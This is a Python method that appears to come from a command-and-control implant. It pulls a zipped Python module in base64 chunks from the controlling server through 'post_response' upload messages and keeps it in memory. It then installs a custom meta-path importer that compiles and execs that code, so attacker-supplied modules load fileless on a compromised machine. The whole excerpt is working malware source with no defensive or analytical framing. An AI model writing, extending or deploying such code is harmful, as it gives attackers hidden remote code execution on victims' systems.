    def load_module(self, task_id, file, module_name):
        import zipfile, io

        class CFinder(object):
            def __init__(self, repoName, instance):
                self.moduleRepo = instance.moduleRepo
                self.repoName = repoName
                self._source_cache = {}

            def _get_info(self, repoName, fullname):
                parts = fullname.split('.')
                submodule = parts[-1]
                modulepath = '/'.join(parts)
                _search_order = [('.py', False), ('/__init__.py', True)]
                for suffix, is_package in _search_order:
                    relpath = modulepath + suffix
                    try: self.moduleRepo[repoName].getinfo(relpath)
                    except KeyError: pass
                    else: return submodule, is_package, relpath
                msg = ('Unable to locate module %s in the %s repo' % (submodule, repoName))
                raise ImportError(msg)

            def _get_source(self, repoName, fullname):
                submodule, is_package, relpath = self._get_info(repoName, fullname)
                fullpath = '%s/%s' % (repoName, relpath)
                if relpath in self._source_cache:
                    source = self._source_cache[relpath]
                    return submodule, is_package, fullpath, source
                try:
                    source =  self.moduleRepo[repoName].read(relpath)
                    source = source.replace(b'\r\n', b'\n')
                    source = source.replace(b'\r', b'\n')
                    self._source_cache[relpath] = source
                    return submodule, is_package, fullpath, source
                except: raise ImportError("Unable to obtain source for module %s" % (fullpath))

            def find_module(self, fullname, path=None):
                try: submodule, is_package, relpath = self._get_info(self.repoName, fullname)
                except ImportError: return None
                else: return self

            def load_module(self, fullname):
                import types
                submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
                code = compile(source, fullpath, 'exec')
                mod = sys.modules.setdefault(fullname, types.ModuleType(fullname))
                mod.__loader__ = self
                mod.__file__ = fullpath
                mod.__name__ = fullname
                if is_package:
                    mod.__path__ = [os.path.dirname(mod.__file__)]
                exec(code, mod.__dict__)
                return mod

            def get_data(self, fullpath):

                prefix = os.path.join(self.repoName, '')
                if not fullpath.startswith(prefix):
                    raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
                relpath = fullpath[len(prefix):]
                try:
                    return self.moduleRepo[self.repoName].read(relpath)
                except KeyError:
                    raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))

            def is_package(self, fullname):
                """Return if the module is a package"""
                submodule, is_package, relpath = self._get_info(self.repoName, fullname)
                return is_package

            def get_code(self, fullname):
                submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
                return compile(source, fullpath, 'exec')

        if module_name in self.moduleRepo.keys():
            return "{} module already loaded.".format(module_name)
        total_chunks = 1
        chunk_num = 0
        module_zip = bytearray()
        while (chunk_num < total_chunks):
            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                return "Job stopped."
            data = { "action": "post_response", "responses": [
                    { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file, "chunk_num": chunk_num+1 }, "task_id": task_id }
                ]}
            response = self.postMessageAndRetrieveResponse(data)
            chunk = response["responses"][0]
            total_chunks = chunk["total_chunks"]
            chunk_num+=1
            module_zip.extend(base64.b64decode(chunk["chunk_data"]))

        if module_zip:
            self.moduleRepo[module_name] = zipfile.ZipFile(io.BytesIO(module_zip))
            if module_name not in self._meta_cache:
                finder = CFinder(module_name, self)
                self._meta_cache[module_name] = finder
                sys.meta_path.append(finder)        
        else: return "Failed to download in-memory module"
